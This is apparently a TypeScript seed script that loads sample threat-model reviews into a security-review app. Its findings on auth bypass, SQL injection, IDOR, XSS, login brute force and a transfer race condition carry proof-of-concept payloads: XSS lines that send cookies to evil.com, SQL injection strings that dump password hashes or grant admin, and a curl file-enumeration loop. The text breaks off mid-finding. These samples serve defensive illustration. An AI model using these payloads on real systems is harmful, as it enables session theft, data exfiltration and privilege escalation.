/**
 * Seed script for review data.
 * Creates a full chain: Tenant → Integration → Events → ContextBundles → Reviews → Findings
 *
 * Each review has realistic, differentiated findings based on actual
 * threat modeling analysis (STRIDE methodology, OWASP patterns).
 *
 * Usage: bun packages/db/prisma/seed-reviews.ts
 */
import { db } from "../src/index";

const TENANT_NAME = "Test Organization";
const WORKOS_ORG_ID = "org_01K3M4QS907CN7K366594YJPBT";

// ─── Realistic Review Data ──────────────────────────────────────────────────

interface SeedFinding {
  type: "THREAT" | "REQUIREMENT" | "MITIGATION" | "OBSERVATION";
  title: string;
  description: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  strideCategory: string;
  effortEstimate: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  status: "OPEN" | "ACCEPTED" | "RESOLVED" | "REJECTED" | "DEFERRED";
}

interface SeedReview {
  title: string;
  summary: string;
  riskLevel: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
  bundleStatus: "COMPLETED" | "REVIEWING";
  reviewStatus: string;
  source: "LINEAR" | "NOTION";
  externalId: string;
  findings: SeedFinding[];
}

const REVIEWS: SeedReview[] = [
  {
    title: "Authentication bypass in payment service",
    summary: "The payment service's `/api/payments/process` endpoint accepts requests without validating the session token when the `X-Internal-Service` header is present. This header was intended for **service-to-service communication** but is accessible from external clients, allowing any HTTP client to bypass authentication entirely.\n\n**Impact:** An attacker can gain full access to payment processing capabilities including:\n\n- Initiating refunds to arbitrary accounts via `POST /api/payments/refund`\n- Modifying transaction amounts mid-flight through `PUT /api/payments/:id`\n- Accessing payment history for all users through `GET /api/payments/history`\n\nThe vulnerability affects all payment-related endpoints that use the shared `validateAuth()` middleware. The header has been present since commit `a3f9c12` (March 2024) when inter-service auth was introduced. The `processPayment()` function in `src/middleware/auth.ts` explicitly short-circuits when this header is detected.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-001",
    findings: [
      {
        type: "THREAT",
        title: "Authentication bypass via X-Internal-Service header spoofing",
        description: "External clients can add the `X-Internal-Service` header to any HTTP request, causing the `validateAuth()` middleware to skip token validation entirely. The middleware performs a truthy check without verifying request origin or validating a shared secret.\n\n**Root cause:** The middleware checks for header presence without any cryptographic verification:\n\n```typescript\nif (req.headers['x-internal-service']) {\n  // Intended for internal microservice calls\n  return next(); // Skips ALL auth checks\n}\n```\n\nThis grants **unauthenticated access** to every endpoint protected by this middleware. Any HTTP client (curl, Postman, browser extensions) can add this header. The attack requires zero credentials and zero prior knowledge beyond the header name, which is discoverable through error messages that reference \"internal service mode\" in verbose 401 responses.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Unauthorized refund initiation via bypassed authentication",
        description: "With authentication bypassed via the `X-Internal-Service` header, an attacker can call `POST /api/payments/refund` with arbitrary transaction IDs and refund amounts. The endpoint lacks secondary authorization checks, amount ceiling validation, or approval workflows.\n\n**Exploitation steps:**\n1. Send request with `X-Internal-Service: true` header\n2. Call `POST /api/payments/refund` with `{\"transactionId\": \"txn_xxx\", \"amount\": 50000}`\n3. No secondary authorization check validates the caller's identity\n4. No rate limiting or velocity check prevents rapid repeated calls\n5. Funds are transferred within the Stripe settlement window\n\nThe refund endpoint processes requests **synchronously** and returns the Stripe refund ID in the response, confirming success immediately. An attacker can drain merchant accounts at approximately 200 refunds/minute based on Stripe API rate limits.",
        severity: "CRITICAL",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement mutual TLS or signed tokens for internal service auth",
        description: "Service-to-service authentication must use **mutual TLS certificates** or **cryptographically signed service tokens** (e.g., AWS IAM roles, SPIFFE IDs) rather than a trivially spoofable HTTP header. The current header-based approach provides zero security against external attackers.\n\n**Requirements:**\n- Validate calling service identity against a registered service allowlist maintained in `config/services.yaml`\n- Use short-lived tokens (< 5 min expiry) with `aud` (audience) claims restricting which services can call which endpoints\n- Log all inter-service calls with source identity, target endpoint, and timestamp for audit trail\n- Reject requests from unrecognized services with `403 Forbidden` and alert the security team\n- Implement certificate rotation with zero-downtime using dual-cert validation during rotation windows",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Strip X-Internal-Service header at the ingress gateway",
        description: "As an **immediate mitigation** (deploy within hours), configure the API gateway or load balancer to strip the `X-Internal-Service` header from all inbound external traffic. This prevents external clients from spoofing internal service calls while the proper mTLS solution is developed.\n\n**Implementation for nginx:**\n```nginx\n# Strip internal service header from all external requests\nproxy_set_header X-Internal-Service \"\";\n```\n\n**Implementation for AWS ALB:**\n```yaml\n# ALB rule to remove header before forwarding\nActions:\n  - Type: fixed-response\n    FixedResponseConfig:\n      ContentType: text/plain\n      StatusCode: '403'\n    Conditions:\n      - Field: http-header\n        HttpHeaderConfig:\n          HttpHeaderName: X-Internal-Service\n```\n\nThis is a **same-day deployable** fix that eliminates the attack vector immediately. Internal services communicating over the private VPC network will not be affected since they bypass the ingress gateway.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "ACCEPTED",
      },
      {
        type: "OBSERVATION",
        title: "No audit logging exists for payment operations",
        description: "Payment processing endpoints lack structured audit logging. Even after the authentication bypass is fixed, there is **no way to determine if this vulnerability was previously exploited** during the 3+ months it was live in production. The `payments` service writes only generic access logs without business-context fields.\n\n**Recommended audit log fields:**\n- Caller identity (authenticated user ID or service name)\n- Source IP address and `User-Agent` header\n- Full request payload (amount, recipient account, transaction reference)\n- Timestamp with millisecond precision and timezone\n- Response status code and processing duration\n- Correlation ID linking to upstream service calls\n\nThis audit data should feed into the SIEM (Splunk/DataDog) for real-time anomaly detection. Set up alerts for: refunds exceeding $1000, more than 5 refunds per hour from a single source, and any refund where the initiator differs from the original transaction creator.",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },
  {
    title: "SQL injection risk in user search endpoint",
    summary: "The `GET /api/v1/users/search` endpoint constructs SQL queries by directly interpolating the `q` query parameter into a `LIKE` clause without parameterization. The endpoint uses a **raw query builder** (`db.$queryRawUnsafe`) to support full-text search across multiple columns (`name`, `email`, `department`). While the ORM is used elsewhere in the codebase, this endpoint bypasses it for performance reasons cited in a code comment from 6 months ago.\n\nAn attacker can inject arbitrary SQL to extract data from any table, modify records, or potentially achieve **remote code execution** via PostgreSQL's `COPY TO PROGRAM` or `lo_export` functions. The vulnerability is exploitable by any authenticated user with access to the user directory feature. Testing confirmed successful `UNION SELECT` extraction of the `api_keys` table contents.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "LINEAR",
    externalId: "LOO-003",
    findings: [
      {
        type: "THREAT",
        title: "Data exfiltration via UNION-based SQL injection",
        description: "The `q` search parameter can be injected with `UNION SELECT` statements to extract data from arbitrary tables including `users` (password hashes), `api_keys` (service credentials), and `billing_info` (payment details). The injection point is inside a `LIKE` clause that is closed and extended with attacker-controlled SQL.\n\n**Proof of concept:**\n```sql\nGET /api/v1/users/search?q=' UNION SELECT id, password_hash, email, api_key FROM users --\n```\n\nThe response returns injected data in the normal search results JSON format, with columns mapped to `name`, `email`, `department`, and `avatar_url` fields respectively. The attacker receives structured JSON containing the exfiltrated data, making automated extraction trivial. Column count matching is required (4 columns), which is easily determined through `ORDER BY` probing.",
        severity: "CRITICAL",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Privilege escalation via stacked UPDATE injection",
        description: "The PostgreSQL driver configuration enables **multiple statements** (`multipleStatements: true` in the connection config), allowing stacked queries. An attacker can inject `UPDATE` statements after the `SELECT` to modify their own role or any user's permissions directly in the database.\n\n**Exploitation payload:**\n```sql\nGET /api/v1/users/search?q='; UPDATE users SET role='admin' WHERE email='attacker@evil.com'; --\n```\n\nThis immediately grants full administrative access to the platform. The attack is **blind** (no direct response confirmation) but the attacker can verify success by attempting to access admin endpoints. The `role` column has no database-level constraint preventing arbitrary values, relying entirely on application-layer validation that is bypassed here.",
        severity: "CRITICAL",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Replace raw SQL with parameterized queries or ORM methods",
        description: "All database queries **must** use parameterized statements (`db.$queryRaw` with tagged template literals) or the ORM's query builder. The raw SQL performance optimization should be replaced with a properly indexed **full-text search** implementation.\n\n**Recommended approach:**\n```typescript\n// BEFORE (vulnerable)\nconst results = await db.$queryRawUnsafe(\n  `SELECT * FROM users WHERE name LIKE '%${query}%'`\n);\n\n// AFTER (safe - using parameterized query)\nconst results = await db.$queryRaw`\n  SELECT * FROM users\n  WHERE to_tsvector('english', name || ' ' || email) @@ plainto_tsquery('english', ${query})\n`;\n```\n\nPostgreSQL's `tsvector`/`tsquery` with a GIN index provides **equivalent or better performance** than raw `LIKE` with `%` wildcards, while being completely immune to injection. Add a GIN index on the search columns: `CREATE INDEX idx_users_search ON users USING gin(to_tsvector('english', name || ' ' || email));`",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Deploy WAF rules and input validation as interim defense",
        description: "Until the query is rewritten with proper parameterization, deploy **multiple layers** of interim protection. Note that these are defense-in-depth only; WAF bypass techniques exist and input validation alone **cannot fully prevent** SQL injection.\n\n**Immediate actions:**\n- Deploy WAF rules blocking common injection patterns (`UNION`, `SELECT`, `INSERT`, `UPDATE`, `DELETE`, `DROP`, `--`, `/**/`)\n- Add input validation rejecting SQL metacharacters: `'`, `\"`, `;`, `--`, `/*`, `*/`\n- Limit the `q` parameter to 100 characters maximum\n- Add regex allowlist: `/^[a-zA-Z0-9\\s@._-]+$/`\n\n**Limitations:** Encoded payloads (`%27` for `'`), case alternation (`uNiOn SeLeCt`), and comment-based obfuscation can bypass simple WAF rules. This mitigation buys time but does **not** replace parameterized queries.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "Database connection uses overprivileged service account",
        description: "The application connects to PostgreSQL using a service account with `SUPERUSER` privileges. Even with the SQL injection fixed, any future injection vulnerability would grant **full database control** including creating new roles, reading system tables, and executing operating system commands via `COPY TO PROGRAM`.\n\n**Recommendations:**\n- Create a dedicated application user with minimal required privileges\n- Grant only `SELECT`, `INSERT`, `UPDATE`, `DELETE` on specific application tables\n- Revoke `CREATE`, `DROP`, `ALTER`, and all system-level permissions\n- Use separate read-only credentials for search/reporting queries\n- Enable `pg_audit` extension to log all DDL and privilege escalation attempts\n\nThe principle of least privilege would contain the blast radius of any future injection vulnerability to only the data the application legitimately needs to access.",
        severity: "MEDIUM",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Insecure direct object reference in file download API",
    summary: "The file download endpoint `GET /api/files/:fileId` serves files based solely on the `fileId` URL parameter without verifying that the requesting user has **any authorization** to access the file. File IDs are sequential integers (auto-incrementing primary key), making enumeration trivial with a simple `for` loop. Any authenticated user can download any file in the system by iterating through file IDs.\n\nThe vulnerability exposes **confidential HR documents**, financial reports, legal contracts, and other tenants' data in the multi-tenant deployment. The endpoint also lacks rate limiting, enabling bulk exfiltration at approximately 500 files/minute. Access control is enforced only in the UI by filtering the file listing query, but the download endpoint itself performs zero authorization checks against the `files.owner_id` or `files.tenant_id` columns.",
    riskLevel: "HIGH",
    bundleStatus: "REVIEWING",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-005",
    findings: [
      {
        type: "THREAT",
        title: "Cross-tenant data access via sequential file ID enumeration",
        description: "File IDs are sequential integers (`1, 2, 3...`) generated by PostgreSQL's `SERIAL` type. An attacker can write a trivial enumeration script to iterate through all IDs and download every file in the system regardless of tenant ownership or access level.\n\n**Proof of concept:**\n```bash\nfor id in $(seq 1 10000); do\n  curl -s -H \"Authorization: Bearer $TOKEN\" \\\n    \"https://app.example.com/api/files/$id\" \\\n    -o \"stolen_file_$id\" &\ndone\n```\n\nTesting confirmed that files belonging to **other tenants** are served without any error. The response includes the original filename in the `Content-Disposition` header, allowing the attacker to identify high-value targets (e.g., `Q4_Financial_Report.xlsx`, `employee_salaries_2024.csv`). No rate limiting or anomaly detection prevents downloading thousands of files in minutes.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Confidential document exposure without server-side authorization",
        description: "Files marked as `confidential` or `restricted` in the `files.access_level` metadata column are still served by the download endpoint without restriction. The `access_level` field is only used for **UI display purposes** (showing a lock icon) and is not enforced server-side in the download handler.\n\n**Affected document categories:**\n- HR documents: offer letters, performance reviews, termination records\n- Financial data: salary spreadsheets, revenue projections, investor reports\n- Legal contracts: NDAs, partnership agreements, acquisition documents\n- Engineering: API keys in config files, architecture diagrams with internal IPs\n\nThe download controller at `src/controllers/files.ts:47` performs only a `db.files.findUnique({ where: { id } })` query with no `where` clause filtering by `tenantId` or `ownerId`. The file's binary content is streamed directly from S3 using the stored `s3Key` without any permission check.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement server-side ownership and RBAC verification on file access",
        description: "The download endpoint **must** verify that the requesting user: (1) belongs to the same tenant as the file, AND (2) has appropriate role-based permissions for the file's access level. Authorization checks must be enforced in the API layer, never delegated to client-side filtering.\n\n**Implementation requirements:**\n```typescript\n// Required authorization check before serving file\nconst file = await db.files.findUnique({ where: { id: fileId } });\nif (!file) return res.status(404).json({ error: 'Not found' });\nif (file.tenantId !== req.user.tenantId) return res.status(404).json({ error: 'Not found' });\nif (file.accessLevel === 'CONFIDENTIAL' && !req.user.roles.includes('admin')) {\n  return res.status(403).json({ error: 'Insufficient permissions' });\n}\n```\n\n- Return `404` (not `403`) for cross-tenant access to avoid confirming file existence\n- Log all access attempts with user ID, file ID, and authorization decision\n- Add integration tests covering cross-tenant access, role-based restrictions, and non-existent file IDs",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Replace sequential IDs with UUIDs and add signed download URLs",
        description: "Migrate file identifiers from sequential integers to **UUIDv4** to eliminate trivial enumeration. Additionally, implement **signed download URLs** with short expiry times that encode the authorized user's identity.\n\n**Migration plan:**\n1. Add `uuid` column to `files` table: `ALTER TABLE files ADD COLUMN uuid UUID DEFAULT gen_random_uuid();`\n2. Create index: `CREATE UNIQUE INDEX idx_files_uuid ON files(uuid);`\n3. Update API routes to use UUID: `GET /api/files/:uuid`\n4. Implement signed URLs: `GET /api/files/:uuid/download-url` returns a pre-signed S3 URL valid for 5 minutes\n\n**Note:** UUIDs alone are **insufficient** (security through obscurity). They must be combined with proper authorization checks. However, they eliminate the most trivial attack vector (sequential enumeration) and provide meaningful defense-in-depth. The signed URL approach also offloads bandwidth to S3 and enables granular access logging.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "DEFERRED",
      },
      {
        type: "OBSERVATION",
        title: "File access audit trail is completely absent",
        description: "There is no logging of file download events. The application cannot answer basic forensic questions like \"who downloaded this file?\" or \"how many files did user X access today?\" This makes it impossible to detect ongoing data exfiltration or investigate past breaches.\n\n**Recommended logging implementation:**\n- Log every download: `{ userId, fileId, tenantId, timestamp, ipAddress, userAgent }`\n- Alert on anomalous patterns: >50 downloads/hour from a single user, sequential ID access patterns, downloads outside business hours\n- Retain logs for minimum 90 days for compliance (SOC 2, GDPR Art. 30)\n- Feed into DLP (Data Loss Prevention) system for pattern matching on sensitive file categories",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Cross-site scripting vulnerability in comment rendering",
    summary: "The comment system renders user-submitted markdown content using a custom `markdownToHtml()` renderer that converts markdown to HTML. The renderer correctly handles standard markdown syntax (bold, italic, links, code blocks) but **fails to sanitize raw HTML blocks**, which the CommonMark specification explicitly allows within markdown content.\n\nAn attacker can inject arbitrary JavaScript via HTML tags in comments (e.g., `<img onerror>`, `<svg onload>`, `<details ontoggle>`). The XSS payload executes in the **security context of other users** viewing the comment, providing access to their session tokens stored in `document.cookie`. This enables full account takeover, performing actions on behalf of victims, or spreading self-propagating XSS worms through auto-posted comments. The vulnerability affects all pages where comments are displayed including project discussions, code reviews, and task updates.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "APPROVED",
    source: "NOTION",
    externalId: "PAGE-002",
    findings: [
      {
        type: "THREAT",
        title: "Stored XSS via raw HTML injection in markdown comments",
        description: "The custom `markdownToHtml()` renderer passes through raw HTML blocks without sanitization, as permitted by the CommonMark specification. Attackers can inject event handler attributes that execute JavaScript when the comment is viewed by any user.\n\n**Proof of concept payloads:**\n```html\n<!-- Image with error handler -->\n<img src=x onerror='fetch(`https://evil.com/steal?c=`+document.cookie)'>\n\n<!-- SVG with onload -->\n<svg onload='new Image().src=\"https://evil.com/\"+document.cookie'>\n\n<!-- Details element with toggle event -->\n<details ontoggle='eval(atob(\"ZmV0Y2goImh0dHA6...\"))'><summary>Click</summary></details>\n```\n\nSince comments are **persistent** (stored in the database), this is a stored/persistent XSS vulnerability. Every user who views the page containing the malicious comment will have the payload execute in their browser. The payload runs with full access to the DOM, cookies, localStorage, and can make authenticated API requests as the victim.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "THREAT",
        title: "Session hijacking via stolen authentication cookies",
        description: "Authentication session tokens are stored in cookies **without the `HttpOnly` flag**, making them accessible to JavaScript via `document.cookie`. XSS payloads can read and exfiltrate these tokens to attacker-controlled servers, enabling **full account takeover** without requiring the victim's password.\n\n**Attack chain:**\n1. Attacker posts comment with XSS payload targeting `document.cookie`\n2. Victim views the page; payload executes and sends cookies to `https://evil.com/collect`\n3. Attacker uses stolen session token to impersonate victim via `Cookie: session=<stolen_value>`\n4. Attacker has full access to victim's account, data, and can change email/password\n\nThe session tokens have a **7-day expiry** and are not bound to IP address or user-agent, meaning a stolen token remains valid for a week regardless of where it's used. There is no concurrent session detection to alert the legitimate user.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "MITIGATION",
        title: "Integrate DOMPurify for HTML sanitization after markdown rendering",
        description: "Add **DOMPurify** as a post-processing step after the `markdownToHtml()` renderer to strip all dangerous HTML elements and event handler attributes. This neutralizes both current and future XSS vectors in user-generated content.\n\n**Implementation:**\n```typescript\nimport DOMPurify from 'dompurify';\nimport { JSDOM } from 'jsdom';\n\nconst window = new JSDOM('').window;\nconst purify = DOMPurify(window);\n\nconst ALLOWED_TAGS = ['p', 'em', 'strong', 'a', 'code', 'pre', 'ul', 'ol', 'li',\n  'blockquote', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'br', 'hr', 'table',\n  'thead', 'tbody', 'tr', 'th', 'td', 'img'];\n\nconst ALLOWED_ATTR = ['href', 'src', 'alt', 'title', 'class'];\n\nexport function renderComment(markdown: string): string {\n  const rawHtml = markdownToHtml(markdown);\n  return purify.sanitize(rawHtml, { ALLOWED_TAGS, ALLOWED_ATTR });\n}\n```\n\nDOMPurify handles edge cases like mutation XSS, namespace confusion, and encoding tricks that simple regex-based sanitizers miss. The `ALLOWED_TAGS` whitelist ensures only safe formatting elements survive.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "REQUIREMENT",
        title: "Set HttpOnly, Secure, and SameSite flags on all session cookies",
        description: "All authentication cookies must be configured with security flags that prevent JavaScript access and cross-site leakage. This provides **defense-in-depth** against session theft even if XSS vulnerabilities exist or are introduced in the future.\n\n**Required cookie attributes:**\n- `HttpOnly` — prevents `document.cookie` access from JavaScript, blocking XSS-based session theft\n- `Secure` — ensures cookies are only sent over HTTPS connections\n- `SameSite=Strict` — prevents cookies from being sent with cross-site requests, mitigating CSRF\n- `Path=/` — scope cookies appropriately\n- `Max-Age=86400` — reduce session lifetime from 7 days to 24 hours\n\n**Implementation in session middleware:**\n```typescript\nres.cookie('session', token, {\n  httpOnly: true,\n  secure: process.env.NODE_ENV === 'production',\n  sameSite: 'strict',\n  maxAge: 86400000, // 24 hours\n  path: '/'\n});\n```",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "Content-Security-Policy header is not configured",
        description: "The application does not set a `Content-Security-Policy` (CSP) response header. Adding CSP with `script-src 'self'` would prevent inline script execution and block XSS payloads **even if sanitization is bypassed** through novel techniques or future regressions.\n\n**Recommended CSP configuration:**\n```\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-{random}';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' https: data:;\n  connect-src 'self' https://api.example.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n```\n\nCSP acts as a **last line of defense** when all other sanitization measures fail. The `nonce`-based approach allows legitimate inline scripts while blocking attacker-injected ones. Combined with `Trusted Types` enforcement, this virtually eliminates DOM XSS as an attack class. Report violations to a monitoring endpoint via `report-uri` directive for visibility into attempted attacks.",
        severity: "LOW",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Missing rate limiting on login endpoint",
    summary: "The `POST /auth/login` endpoint has **no rate limiting**, no account lockout mechanism, and no CAPTCHA challenge after repeated failures. The endpoint also responds with distinct error messages for invalid username (`\"User not found\"`) vs. invalid password (`\"Invalid password\"`), enabling username enumeration as a precursor to credential stuffing.\n\nCombined with the lack of throttling, an attacker can perform credential stuffing attacks using leaked credential databases (e.g., Collection #1-5 with 2.2 billion records) at thousands of attempts per second. Testing confirmed that **10,000 login attempts from a single IP in 60 seconds** did not trigger any blocking, alerting, or degradation. The endpoint also does not log failed authentication attempts, making attack detection impossible through current monitoring infrastructure.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-009",
    findings: [
      {
        type: "THREAT",
        title: "Credential stuffing attack via unlimited login attempts",
        description: "Without rate limiting, an attacker can attempt thousands of username/password combinations per second using leaked credential databases. The login endpoint responds in approximately **2ms** per attempt, enabling extremely high throughput brute-force attacks.\n\n**Attack economics:**\n- Observed throughput: ~500 requests/second from a single connection\n- With 10 parallel connections: ~5,000 attempts/second\n- Time to test 1 million leaked credentials: ~3.3 minutes\n- Typical credential reuse rate: 2-5% of users reuse passwords\n- Expected compromised accounts per million attempts: 20,000-50,000\n\n**Tools available to attackers:** Hydra, Burp Suite Intruder, custom async scripts with `aiohttp`. The attack is trivially automated and credential databases are freely available on dark web forums. The absence of any defensive mechanism (CAPTCHA, lockout, rate limit, device fingerprinting) makes this a **zero-sophistication attack** with high impact.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Username enumeration via differential error responses",
        description: "The login endpoint returns semantically different error messages based on failure reason, allowing attackers to determine which usernames are valid before attempting password attacks.\n\n**Observed responses:**\n```json\n// Invalid username\n{\"error\": \"User not found\", \"code\": \"AUTH_USER_NOT_FOUND\"}\n\n// Valid username, wrong password  \n{\"error\": \"Invalid password\", \"code\": \"AUTH_INVALID_PASSWORD\"}\n```\n\nAdditionally, response **timing differs**: invalid usernames return in ~1ms (short-circuit before bcrypt), while valid usernames with wrong passwords take ~150ms (bcrypt comparison). This timing side-channel enables enumeration even if error messages are normalized. An attacker can compile a list of valid usernames, then focus credential stuffing only on confirmed accounts, dramatically improving attack efficiency.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement progressive rate limiting on authentication endpoints",
        description: "Apply **multi-layered rate limiting** that escalates defensive measures based on failure volume. The system must defend against both targeted (single account) and distributed (many accounts from many IPs) credential attacks.\n\n**Required rate limiting tiers:**\n1. **Per-IP limit:** Max 10 failed attempts/minute → 429 response with `Retry-After` header\n2. **Per-account limit:** Max 5 failed attempts → temporary 15-minute lockout with email notification to account owner\n3. **CAPTCHA trigger:** After 3 failed attempts from any IP, require hCaptcha/reCAPTCHA v3 verification\n4. **Exponential backoff:** Delay = `min(2^failures * 1000ms, 30000ms)` applied server-side before responding\n5. **Global anomaly detection:** Alert security team when total failed logins exceed 10x baseline across all accounts\n\n**Implementation stack:** Use Redis with sliding window counters (`INCR` + `EXPIRE`) for per-IP and per-account tracking. The rate limiter must be applied **before** the authentication logic to prevent resource exhaustion on bcrypt operations.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Normalize error responses and add constant-time comparison",
        description: "Return a **generic, identical response** for all authentication failures regardless of whether the username exists. Additionally, ensure constant response timing to prevent timing-based enumeration.\n\n**Implementation:**\n```typescript\nasync function login(email: string, password: string) {\n  const user = await db.users.findUnique({ where: { email } });\n  \n  // Always perform bcrypt comparison, even for non-existent users\n  const dummyHash = '$2b$12$LJ3m4sMKfHYfTHB6mN9NeO'; // pre-computed dummy\n  const hashToCompare = user?.passwordHash ?? dummyHash;\n  const isValid = await bcrypt.compare(password, hashToCompare);\n  \n  if (!user || !isValid) {\n    // Generic error - identical for all failure modes\n    return { error: 'Invalid credentials', code: 'AUTH_FAILED' };\n  }\n  // ... success path\n}\n```\n\nThe **dummy bcrypt comparison** ensures timing is constant (~150ms) regardless of whether the user exists, eliminating the timing side-channel. The error message and HTTP status code (401) must be identical for all failure cases.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "Failed login attempts are not logged or monitored",
        description: "The authentication system does not log failed login attempts to any monitoring system. There is **zero visibility** into ongoing brute-force or credential stuffing attacks. The security team cannot detect, investigate, or respond to authentication-based attacks.\n\n**Required logging for each failed attempt:**\n- Timestamp (ISO 8601 with timezone)\n- Source IP address and `X-Forwarded-For` chain\n- Attempted username/email\n- Failure reason (for internal classification, not exposed to user)\n- `User-Agent` and device fingerprint\n- Geographic location (via GeoIP lookup)\n\n**Alert thresholds to configure:**\n- >50 failures from single IP in 5 minutes → block IP, alert SOC\n- >10 failures against single account in 10 minutes → lock account, notify user\n- >1000 total failures in 10 minutes → potential distributed attack, engage incident response\n\nLogs should be shipped to the SIEM with a 30-day retention minimum. Integrate with threat intelligence feeds to flag known-malicious IPs.",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Race condition in balance transfer endpoint",
    summary: "The `POST /api/transfers` endpoint reads the sender's balance, validates sufficiency, then debits the sender and credits the receiver in **separate database operations** without transactional isolation or row-level locking. By sending multiple concurrent transfer requests, an attacker can exploit the **time-of-check-to-time-of-use** (TOCTOU) gap to transfer more funds than their actual balance allows.\n\nTesting with 10 concurrent requests of $100 from an account with $100 balance resulted in **all 10 succeeding**, creating $900 from nothing. The vulnerability exists because the balance check (`SELECT balance`) and debit (`UPDATE balance = balance - amount`) are not atomic. The PostgreSQL isolation level is set to `READ COMMITTED` rather than `SERIALIZABLE`, and no `SELECT FOR UPDATE` lock is acquired during the balance read.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "NOTION",
    externalId: "PAGE-004",
    findings: [
      {
        type: "THREAT",
        title: "Double-spend via concurrent transfer requests exploiting TOCTOU gap",
        description: "An attacker can send multiple simultaneous transfer requests that all pass the balance validation check before any debit is written. The vulnerable code pattern reads balance and writes debit as separate operations:\n\n**Vulnerable code flow:**\n```typescript\nasync function transfer(senderId: string, recipientId: string, amount: number) {\n  // STEP 1: Read balance (not locked)\n  const sender = await db.accounts.findUnique({ where: { id: senderId } });\n  \n  // STEP 2: Check sufficiency (stale data in concurrent scenario)\n  if (sender.balance < amount) throw new Error('Insufficient funds');\n  \n  // STEP 3: Debit sender (another request may have already debited)\n  await db.accounts.update({\n    where: { id: senderId },\n    data: { balance: { decrement: amount } }\n  });\n  \n  // STEP 4: Credit recipient\n  await db.accounts.update({\n    where: { id: recipientId },\n    data: { balance: { increment: amount } }\n  });\n}\n```\n\n**Race window:** Between steps 1 and 3, concurrent requests all read the same original balance ($100) and all pass the check. With 50 concurrent $100 transfers from a $100 account, all 50 succeed because each reads `balance = 100` before any write lands.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Unlimited fund extraction via negative balance exploitation",
